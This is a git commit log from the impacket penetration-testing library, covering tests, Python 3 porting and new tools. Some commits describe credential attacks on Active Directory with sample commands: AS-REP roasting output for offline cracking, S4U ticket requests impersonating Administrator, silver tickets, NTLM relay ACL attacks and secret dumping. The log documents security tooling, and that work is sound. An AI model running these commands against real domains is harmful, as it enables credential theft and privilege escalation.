Date:   Tue Jun 5 14:36:22 2018 -0300

    Fixed wrong indentation when printing results

commit b789e61b9680dd156b50b0f6c2d9dbb1c15653e3
Author: asolino <bethus@gmail.com>
Date:   Thu May 31 12:38:47 2018 -0300

    Using a cryptographically secure pseudo-random number generator when needed
    
    * We must investigate if there are other places where this switch is needed.
    * Thanks @4dgifts (Ivan Arce) for highlighting this.

commit 1afae4c801b4db6bb80282098ec3d093ee73bb3f
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 18:56:40 2018 -0300

    Going back to dev version :)

commit e7fd42aa6874e240675dc92ae4ae874d71778305
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 18:45:41 2018 -0300

    Specifying README.md is in markdown mode.
    
    So it renders well in PyPi.

commit 6ddd60ded42a73e41a9d3631576d3c8f045d2d21
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 16:48:46 2018 -0300

    Fixed typo

commit 770a017e6a9d53dd9bdd2525546365a18e0d9bce
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:47:19 2018 -0300

    Changing from dev version to release version for tagging.

commit ee1800c73e1313ef6feca9b1fcc9a22a727ed63a
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:22:16 2018 -0300

    Updated README

commit f992ef5c69606f82132d6e88a804fab8c672a1c3
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:17:45 2018 -0300

    Adjusting test cases for Windows 2012 R2 and update on README

commit c25153533597b80829421c9e28bb40852cf4b0e1
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 09:09:51 2018 -0300

    Updated README

commit 633b75301bead95399ca9ff18b70ec7039813999
Author: asolino <bethus@gmail.com>
Date:   Tue May 29 15:50:22 2018 -0300

    Removing old examples

commit bada8a719f8ed7be4633514eea94bc768dbaf019
Author: asolino <bethus@gmail.com>
Date:   Tue May 29 10:58:03 2018 -0300

    Adding GetNPUsers.py script
    
    This script will attempt to list and get TGTs for those users that have the property
    'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
    For those users with such configuration, a John The Ripper output will be generated so
    you can send it for cracking.
    
    Original credit for this technique goes to @harmj0y:
    http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
    Related work by Geoff Janjua:
    http://www.exumbraops.com/layerone2016/party
    
    For usage instructions run the script with no parameters
    There are a few modes for using this script
    
    1. Get a TGT for a user:
    
            GetNPUsers.py contoso.com/john.doe -no-pass
    
    For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script,
    otherwise a badpwdcount entry will be added to the user
    
    2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set
    
            GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily
    
    This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set.
    However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)
    
    3. Request TGTs for all users
    
            GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily

commit 5f5678ba8f72b32a86b8fe01778db304e12bf2b3
Author: asolino <bethus@gmail.com>
Date:   Mon May 28 18:50:45 2018 -0300

    Documentation change plus using logging.error instead of print

commit 18753898e51683bfc2ff11d1b21798022e20d088
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 20:48:52 2018 -0300

    Optimized imports

commit 02401816125107e12d0fd10d432d39554e33ed4c
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 20:16:45 2018 -0300

    Closing the socket when transport connection is disconnected

commit 5bb942480d4be3871c92af2c49e4f2d3a5857e68
Merge: 65359e84 50e289ba
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:23:31 2018 -0300

    Merge branch 'logging-enhancement' of https://github.com/derUnbekannt/impacket

commit 65359e849267791e6206428e9f9887d00b6ee32d
Merge: ddc7523e c265b146
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:02:18 2018 -0300

    Merge branch 'ropnop-feature/enum_local_admins'

commit c265b146dbafbc9fb91a5821fed572c6a6be9c03
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:01:51 2018 -0300

    Removing unused code.

commit 131b149f6c590eb7c914ef2b1179ed458985c612
Merge: ddc7523e 143a8573
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 10:21:31 2018 -0300

    Merge branch 'feature/enum_local_admins' of https://github.com/ropnop/impacket into ropnop-feature/enum_local_admins

commit ddc7523e71b00bf6f8b36f81058697a2a3ae0e60
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 09:59:12 2018 -0300

    Adding encryption type ID to help John identifying the right format to crack

commit 9bf625a131739737c4d03208ee9ef32cc04b3984
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:42:54 2018 -0300

    Adding domain name alongside with principal name when crafting John output

commit 709a58c88df84b656c0ecabbfd1fb141328c7ae8
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:28:19 2018 -0300

    preAuth should be False in order to print TGTs with John output

commit 11310aba356ded20e9989f0a753bf40d1128f75d
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:23:49 2018 -0300

    Enable John output for TGTs with no preauth enabled
    
    - Just run the scripts with -debug.
    - Thanks @dmchell for the idea.

commit 143a8573fd646e3647f89633eb3df7b656a9544b
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Sat May 19 15:39:22 2018 -0400

    added enum local admins option

commit 2ac1811d4d2f5b26e7117e9234c4079cbb156ce6
Author: asolino <bethus@gmail.com>
Date:   Fri May 18 13:28:36 2018 -0300

    Disabled users will not be downloaded by default
    
    * Disabled accounts will be included if -all, that replaced -all-users switch
    * When using -user switch, if the account is disabled, no records will return. You will need to specify -all in order to get something.
    * Should address https://github.com/CoreSecurity/impacket/issues/454#issuecomment-390240413

commit 48f436ff498c76ed9ee7169c29fd789f0efcb205
Merge: 33bcdb78 9910f221
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu May 17 13:26:50 2018 -0300

    Merge pull request #453 from derUnbekannt/GetUserSPNs-bugfix
    
    Replace global variables usage

commit 9910f2214a00d02900aeee1329dc661ec2d45efd
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Wed May 16 22:30:19 2018 -0300

    Replace global variables usage

commit 33bcdb78b5f806b643e07a7dff3d4ac9e0fabf1f
Merge: d4fa26ec f09cf20d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 14 16:41:59 2018 -0300

    Merge pull request #445 from Mikkgn/win2000
    
    Changed DCOM minor version

commit d4fa26ecc3a3eda2c3677160c8cc72716b89bc14
Merge: 42e6367b bf4e7acb
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 14 14:38:34 2018 -0300

    Merge pull request #452 from fox-it/security_descriptor
    
    Fixed inherited ACL parsing

commit bf4e7acbd7ab64fa4cb4980b949212afd2bfeae8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon May 14 19:02:39 2018 +0200

    Fixed inherited ACL parsing

commit 50e289bac2b82d5840443de4f005fb07d447b26c
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Fri May 11 20:20:11 2018 -0300

    Use the global logger instance instead of a logger which is the root logger of the hierarchy

commit 42e6367b4cbbcf451985d3334d76e70a6ef50f2f
Author: asolino <bethus@gmail.com>
Date:   Thu May 10 11:30:07 2018 -0300

    Improved query efficiency + unused variables
    
    * LDAP request is explicitly removing machine accounts
    * Some imports and local variables not being used
    * Thanks @derUnbekannt for the changes

commit b45a0d558c401277c47dd07570f08332989f9112
Author: asolino <bethus@gmail.com>
Date:   Wed May 9 12:02:59 2018 -0300

    Adding support for scenarios where PREAUTH is not required.
    
    - Kerberos Auth should now work for those accounts configured with 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH)

commit 7ba11f9ecbf43926bd4a7c92f609a105588bf1c2
Merge: 9d8638cd 260cf20a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat May 5 11:50:23 2018 -0300

    Merge pull request #447 from derUnbekannt/ticketer-bugfix
    
    Bugfix in ticketer using "request" and "hashes" options

commit 260cf20a0647b7e567219d96242efa6c401e44c8
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Fri May 4 23:30:04 2018 -0300

    Fixed an issue in which invalid parameters were passed to the "getKerberosTGT" function.

commit 9d8638cdf10389c999ef2049003bf22219d94d06
Author: asolino <bethus@gmail.com>
Date:   Fri May 4 18:25:44 2018 -0300

    Print traceback info if running in DEBUG mode

commit 0b28d9483234aae90e979bddb6307dd29e95cae6
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 21:21:36 2018 -0300

    Using raise the right way + removing print from traceback.print_exc()

commit 7a4bb1893ddf437e0df696fbbafa984abc1f2833
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 21:00:44 2018 -0300

    Using raise the right way.

commit c65e3bc7c11e42492bc8152961b459b92ccb5a62
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 14:27:37 2018 -0300

    Lowering the paged results to 100 in order to avoid LDAP error
    
    * With 1000 entries we were getting: "LdapErr: DSID-0C060671, comment: The server is sending data faster than the client has been receiving. Subsequent requests will fail until the client catches up"
    
    * Minor changes to make it Python3 compatible

commit f09cf20d486d1fe0f37becc8468b5d0b719e89a1
Author: Mikkgn <michail_gg@mail.ru>
Date:   Sat Apr 28 13:11:56 2018 +0500

    Changed DCOM minor version

commit 505fef1ae24027d5064fc65f81f92856300f46aa
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 23:04:26 2018 -0400

    Don't report failure when opening a service with _history appended
    
    * Because it will probably not exist (this was introduced when dumping LSA secrets history)
    * Improved test cases

commit 0d39e84d46e454ba5d6ed4c1641297a9274d3848
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 21:56:40 2018 -0400

    Records are processed as soon as they are received
    
    * Implementing the search perRecordCallback feature will prevent memory from getting exhausted
    * One drawback tho, is that columns with for the table are fixed, since we don't have all the
      rows for calculating the right width. Maybe we should just output CVS and that's it.

commit 079998368d56b79281fd4b9af92c28d7bb1d6290
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 21:55:03 2018 -0400

    Adding a perRecordCallBack in ldap.search method
    
    * Used in those situation where there are lots of records in the answer that might exhaust the memory or you want faster processing of the records.

commit 8a8b2aabde3b7731764bf8acc431dd17a05e01b4
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 23:21:40 2018 -0400

    Fixing typos in description

commit b022a31ec3f085b50b6b808b2f8cdf0d12d2a39e
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:54:13 2018 -0400

    Adding getST.py example
    
    Given a password, hash, aesKey or TGT in ccache, it will request a Service Ticket
    and save it as ccache.
    If the account has constrained delegation (with protocol transition) privileges
    you will be able to use the -impersonate switch to request the ticket on behalf
    other user (it will use S4U2Self/S4U2Proxy to request the ticket.)
    
    Similar feature has been implemented already by Benjamin Delphi (@gentilkiwi) in Kekeo (s4u)
    
    Examples:
    
        ./getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user
    It will save the ticket in user.ccache
    or
    If you have tickets cached (run klist to verify) the script will use them
        ./getST.py -k -spn cifs/contoso-dc contoso.com/user
    Be sure tho, that the cached TGT has the forwardable flag set (klist -f).
    getTGT.py will ask forwardable tickets by default.
    
    Also, if the account is configured with unconstrained delegation (and with protocol transition)
    you can request service tickets for other users, assuming the target SPN is allowed for
    delegation:
    ./getST.py -k -impersonate Administrator -spn cifs/contoso-dc contoso.com/user
    
    The output of this script will be a service ticket for the Administrator user.
    
    Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.

commit 8368e73c1471b79792788c818a177204c2438f7d
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:35:34 2018 -0400

    Requesting a ST when -request is used for silver ticket creation
    
    * This functionality was missed when this feature was implemented in https://github.com/CoreSecurity/impacket/pull/354.

commit c5a388168c15a3d325c48d25efe9fb6d5d08c841
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:08:00 2018 -0400

    Encrypting the TGS-REP with the right Key Usage (especially for AES)
    
    * When encrypting the kdcRep['enc-part']['cipher'] part you have to use the following Key Usages depending on
    the type of answer being generated. Per RFC 4120, section 7.5.1:
    If it is a AS-REP -> Key Usage 3
    If it is a TGS-REP -> Key Usage 8
    When silver tickets functionality was implemented [here](https://github.com/CoreSecurity/impacket/pull/354),
    this wasn't taken into account that all the answers, regardless of being a AS-REP or TGS-REP were encrypted with Key Usage 3.
    
    You might wonder why RC4 silver tickets where working?
    RFC4757 section 3 has the answer. The Key Usages for RC4 are different by the ones defined in RFC4120 and,
    for example, for the AS-REP the Key Usage to be used is 8 (instead of 3). Thus, all the RC4 testings were
    passing, until @ropnop tested it with AES keys (where the Key Usage numbers to be used are the ones in
    RFC 4120), causing the decryption checks when saving the ticket in ccache format to trigger and error
    due to invalid checksum.
    
    The issue in https://github.com/CoreSecurity/impacket/issues/443#issuecomment-384430424 should be fixed. Please test.

commit dba47572975be66bdccb166cc0a93c4a038d655f
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 15:50:24 2018 -0400

    Adding more test cases

commit 21c8f3bb2c7805a0da6556e06cdfc69938ee3d3d
Merge: c091f0e1 f148f164
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 25 14:25:31 2018 -0400

    Merge pull request #441 from fox-it/security_descriptor
    
    ntlmrelayx ACL attack

commit f148f164f4ef677eb7d4839016b13242a2a21564
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 18:51:22 2018 +0200

    Move smbclient.py to library (part 2/2). Allows using the shell from other examples.

commit 9a7fba86d5bd7e5757d9643afdaf7e8373b42f8b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 18:44:58 2018 +0200

    Move smbclient.py to library (part 1/2)

commit b59ea7d452faa69aede1ddd7cd152e0054a7ef51
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 17:49:24 2018 +0200

    Bump ldap3 version for SD controls

commit 605017f94abc1e087cea4fbe666d38b6dc2b9966
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 17:42:40 2018 +0200

    LDAP ACL attack for ntlmrelayx v1

commit c091f0e1e236a705806fa9eb0e108c66afb933b7
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 20:14:38 2018 -0400

    If loading a module fails, continue

commit e571a45864d1407408fc802082562b58b457a650
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 19:44:00 2018 -0400

    Adding all examples dependency packages into the main installation dependencies
    
    * So users can run the examples right away
    * Added more .gitignore items

commit 3f5ec4a94e6e5a7a5fb7a43b735c4289f040b922
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 19:08:13 2018 -0400

    README clarifications and added test cases and requirement files to MANIFEST.in

commit dcf6f78f6e53fbd124fdbb6221f1822c6f24a7c3
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 18:22:10 2018 -0400

    Defining MSQL as the PLUGIN_NAMES for the MSSQLAttack
    
    * Moving the attacks loading right with the PROTOCOL_CLIENTS.

commit ffdc4369a2dd7bc06f0d11d40baaf750d7454eb7
Merge: 0ba46191 eb80b862
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 17:03:35 2018 -0400

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit eb80b8625c05c700238f4edb9849187e288bf302
Merge: 5dfceef5 c0fa5c78
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 22 18:04:30 2018 -0300

    Merge pull request #432 from fox-it/security_descriptor
    
    Separate ntlmrelayx attacks from main program

commit 0ba461912a49bfdb58a3d7a01cb1d29e0a1f7677
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 16:53:48 2018 -0400

    Fixing a test case based on @dirkjanm feedback

commit 5dfceef59bcc93ca283a9fb8d87b8c2297a6ae22
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 16:01:16 2018 -0400

    Adding another chance of getting the right service ticket from cache
    
    * Let's say we're looking for a ST for this SPN: CIFS/DC2.LABA2.LOCAL@LAB1.LOCAL but in the cache there's a ST for this SPN: CIFS/DC2.LAB2.LOCAL@LAB2.LOCAL. Up until now, the ticket was not returned.. Now it does get returned. Why? It will be useful for some scenarios with cross domain trusts.
    * One particular side effect, the sname will be changed to CIFS/DC2.LAB2.LOCAL@LAB1.LOCAL, that might piss the Kerberos God off but I'll take the risk since snames are not that useful ;).
    * If somebody sees problems please let me know and I'll revert it (@ropnop have this in mind).
    * Thanks @gentilkiwi for the (always) interesting discussion.

commit c0fa5c78ac2993f77db5f0652f7d44d1ea68cb54
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Sun Apr 22 16:39:49 2018 +0200

    Remove leftover debug print statement

commit 678021b4454fa549470790141ff423a0a1fa2a72
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Sun Apr 22 16:35:47 2018 +0200

    Fix dynamic loading of files to be compatible with zipped (.egg) files

commit be1ea72a568c6d015639d851fb6b014745ac8970
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 09:45:45 2018 -0300

    Skip krb5_ccache_conf_data entries when parsing credentials
    
    * Should address https://github.com/CoreSecurity/impacket/issues/438, testing needed (@ropnop)

commit de8dab81b6f6133631c0eeabcdeb08d44983414f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Apr 20 15:31:05 2018 +0200

    Make sure clients explicity return if connecting was a success and other small fixes

commit 0f42016bc44c4327f88ccdc218c859bcd8e8428c
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 20 10:21:00 2018 -0300

    Adding impacket.krb5.crypto tests

commit 587d8afba8dec74d2e7ff4943a2c279d984c3426
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 17:02:59 2018 +0200

    Add start/stop commands for relay servers

commit bf1d51745788499ad0908f41e975b97d670d2260
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:30:39 2018 +0200

    Typo fixes

commit 2ffc5eac02e9b586313cfc2afe743a31bf3890a2
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:14:54 2018 +0200

    Detect SMBv1 being disabled and handle this correctly

commit efa5e7047e480cd52fcd9d0e817789bb8ff39111
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:12:58 2018 +0200

    Rewrote ntlmrelayx attack logic to be similar to protocol clients

commit e171f34d13949c9f760056b6f9511231e529177c
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 17 15:28:30 2018 -0300

    NTLM.PY better support for Python3, not yet there

commit 87d3365029a0a9abc30e55abb98e2cda77ab96f5
Merge: 70fd4b65 09f06069
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 20:40:28 2018 -0300

    Merge remote-tracking branch 'origin/master' into python36

commit 70fd4b658806349c5912273f8a9002d9b52eda55
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 20:35:53 2018 -0300

    Python3 support for crypto.py

commit 09f06069cea242d75cce05e1c83aae7e9fc8f478
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 18:01:32 2018 -0300

    Removing POW support

commit 3fc4637992ae868dac44f574ca395d0e1cf850c0
Merge: 632c52f8 e4b60217
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 16 15:48:55 2018 -0500

    Merge pull request #431 from CoreSecurity/python36
    
     Improving on encoding/decoding NetBIOS names + More test cases

commit e4b60217ecff44d09c1de9fd15e6da19d6d73ef8
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 16:58:18 2018 -0300

    Redefining some functions to make it more Python3 friendly, still not functional

commit a3f1abba44e6cad598fd66aa22b42e3b2dde1f71
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 16:12:30 2018 -0300

    Fixes into [MS-NLMP] test cases
    
    * Better matches the examples in [MS-NLMP]
    * More Python3 friendly

commit 46ebcfb9507dbea3027c7aa138f8e49088a2869a
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 22:00:45 2018 -0500

    NTLM Tests are now Unit Tests

commit 6f15fc3e35f82aa4b64dcb1b336c013217c2c73b
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 17:14:34 2018 -0500

    Adding hexdump for some results

commit 725f4e93570fc3f794963b11f2248b2c483e7967
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 17:12:51 2018 -0500

    Adding hexdump inside structure.py
    
    * Works with Python 3.6
    * Makes more sense to have it here than winregistry. Those modules using the old version will be transitioned once I adapt them to py36

commit dc931d0244ee2346e9cdd30de2b9218bb8ff6888
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 15:10:39 2018 -0500

    Improved test cases + nmb.py closer to python3

commit c6ed5c5a461ec8efa678c92bfcbda4d9a7c5f6bb
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 13:35:08 2018 -0500

    Added more test cases
    
    * nmb: Added test case for NetBIOS name encoding
    * smb: SMB Connections on port 139, plus no NetBIOS name

commit d01ff419a72be95cf048fb33275b5fa44ac4a7f3
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 13:34:05 2018 -0500

    Improvings on encoding/decoding NetBIOS names.
    
    * This should be rewritten completely tho

commit 632c52f8e8bd2c1762cb8e89c75e57b91093617c
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 17:41:14 2018 -0500

    Adding test cases for SR_SECURITY_DESCRIPTOR

commit da8fcb325f613acedb84a33394f4736a9ef3004d
Merge: ce0f300e 6cfda644
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 17:12:37 2018 -0500

    Merge pull request #427 from fox-it/security_descriptor
    
    Added security descriptor types for LDAP

commit ce0f300e2acc30cee9f9c1d6b504a89bb2d410ff
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 16:42:18 2018 -0500

    Adding DHCPM use cases + improvements
    
    * Minor change to RPC Runtime when triggering an exception (include error code even if you can process the structure)
    * Adding test suite to script that runs all tests

commit 7a0971fddf0df6055689bb5e1780716b9e63c10e
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 14:36:48 2018 -0500

    Removing debug print message and fixed error when password was specified.

commit 5d7ed18bedbf919483072cd9a9468c3549a700bf
Merge: fd66648a c2697fdf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 12:54:41 2018 -0500

    Merge pull request #415 from MrAnde7son/patch-3
    
    Added some dhcpsrv2 function implementation and bug fix

commit fd66648aa25658ed86bad78191ce9486ae07c4e8
Merge: 41db9bff e5c60bbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 12:39:25 2018 -0500

    Merge pull request #430 from CoreSecurity/python36
    
    Tox / coverage support + structure.py working with Python36

commit 41db9bff156c48efe43c069d23ad9f813425f997
Merge: c9e0f047 6c69cc46
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 11:19:08 2018 -0500

    Merge pull request #419 from machosec/patch-6
    
    Added support for multiple ExtraSids

commit e5c60bbfd18d308199a87c37c92aa71a5801deb9
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 11:04:25 2018 -0500

    Adding test case for secretsdump
    
    * Only supporting VSS for the moment

commit 6cfda644d992adc05804a48f7c28d1b0f2770cb6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Apr 13 11:13:59 2018 +0200

    Added security descriptor types for LDAP

commit 6c69cc468d2a22aa0f77dcbfe23efa2330d09bcc
Author: Matan Hart <me@matanhart.com>
Date:   Thu Apr 12 18:47:45 2018 +0300

    fixed small mistakes in extrasid

commit 16bafd6f1961661e18f3506556261f23f6691081
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 18:04:34 2018 -0500

    Removing debug print

commit 8138ba725f09eb0154f74edcd82947c4376dfab7
Merge: 1bb117de a1c26d27
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:42:15 2018 -0500

    Merge branch 'python36' of https://github.com/CoreSecurity/impacket into python36

commit 1bb117dedd339a7c5b9c52a74bbea50ec194bf05
Merge: 6c497774 c9e0f047
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:41:58 2018 -0500

    Merge https://github.com/CoreSecurity/impacket into python36

commit 6c497774fdda8ed3db50230a49f6bc25b0dc3d84
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:39:10 2018 -0500

    Adding test_secretsdump to the automatic test script

commit a1c26d2707db829968a16581d83d3b1cd3939a97
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 11 16:47:02 2018 -0500

    Delete __init__.py

commit c9e0f047c27af8b4901bc379c99e2af5dfc3a64e
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:43:26 2018 -0500

    Adding getTGT.py example
    
    Description:
        Given a password, hash or aesKey, it will request a TGT and save it as ccache
    
    Examples:
             ./getTGT.py -hashes lm:nt contoso.com/user

commit c15d447084f665762d3857e088fc6e095463d488
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:39:27 2018 -0500

    Changes to make it run on Python36
    
    * Basic test cases passing in Python36. Just a start.
    * Functionality in Python 27 not affected :)

commit 5261c5bbdc71e58c5ed2f83bcb842ab88e11be61
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:38:21 2018 -0500

    Initial secretsdump test cases
    
    * Right now just checks user/pwd with VSS method enabled

commit cd711636e45aac39a732c12a43202758382ce825
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 14:34:13 2018 -0500

    We're not installing test cases anymore.
    
    * If you want to test the library, git checkout it and run the tests from the checked out repo

commit 7a8acdddfb5a3b459c05f26d6784b7d8acf31fcd
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:43:32 2018 -0500

    Fixed testcases

commit f6ecef0ddaaa99188a725f1ecd86077fe2704f9a
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:42:47 2018 -0500

    If you run runall.sh manually it will not collect coverage data. Meant to be a faster way to launch the test cases

commit 2bd682a42018223c1ae7e6e35e25528080477f0a
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:34:26 2018 -0500

    Tox and coverage support
    
    Now tox/coverage support should work. Just run tox from the main impacket directory and it should run all the test cases (you still need to complete all the parameters in tests/SMB_RPC/dcetests.cfg)
    It will create a test/htmlcov directory, browse the index.html file to get all the coverage stats. Right now we're at 64+% in coveragefor the whole library. Not bad and there are a quick easy wins there.
    Testing and tweaking needed!

commit ac0fba24c3190944aae2f433ea8e8ee4293513a0
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 10:42:17 2018 -0500

    Deleted

commit fbe9b1b046068f19a6b7c9a9751990f51185310b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 20:38:32 2018 -0500

    Adding tox support for faster testing. Will make things easier when adding Python3 support
    
    * Check tox.ini in case you need to change something
    * Don't forget to edit/configure tests/SMB_RPC/dcetests.cfg for all the SMB_RPC test cases
    * Still need to analyze code coverage

commit 9b9af33f097a0a7f8532b93345aa81a319a6c2a6
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 15:58:38 2018 -0500

    Restoring this file wrongly deleted

commit 920ec9e576a55d64805111dd88cf302b5e761e14
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 15:14:44 2018 -0500

    Removing for now

commit 7214ddd11f6fc627b4abf3165d695497e0ed1172
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:12:29 2018 -0500

    Removing unnecesary files

commit 0f6f592ea3c065753cc2c03f9cd002ff29ea9300
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:06:58 2018 -0500

    Moving test cases to root directory

commit 76ffdaa1ef5595a2ab855552fa643d09f318af42
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:06:11 2018 -0500

    Moving to a different path

commit ca26bdd1cc35543518e9403b5bd16178a5493cd0
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:03:50 2018 -0500

    Changing requirements related files

commit f06107ba2829af4caf765d58e918010bb3e9458a
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 22:12:45 2018 -0500

    Changed verbosity

commit 647206c2019035a323849419b8b627679b2a313e
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 22:12:25 2018 -0500

    Changed verbosity

commit 140f356e7cb942a8e9b367f0045bfcd55b5698d0
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 13:48:50 2018 -0300

    Updated Python versions supported

commit 52a324f28a09c81571bddf3cada78a3703292a7b
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 6 18:27:34 2018 -0300

    Adding the exception data to the debug log produced

commit 7d608797073b7e31e1cd1ac54c91076be0d973eb
Merge: cee6e985 ee3e38f3
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:35:59 2018 -0300

    Merge branch 'TheNaterz-master'

commit ee3e38f3eb74e833727d8278d0c3d528fa19df82
Merge: cee6e985 824b57f6
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:34:15 2018 -0300

    Merge branch 'master' of https://github.com/TheNaterz/impacket into TheNaterz-master

commit cee6e9854d64b1d5a5670b0bc348b2aa3fd6aaa7
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:22:35 2018 -0300

    Updated the LSA Secret's Cached Domain Credentials record.
    
    * Thanks @gentilkiwi for figuring out most of the fields
    * Still some things to figure out there, especially when records are not encrypted (looks like it's just blank data)

commit d133648825a10f05b3683e49687026746ee7452f
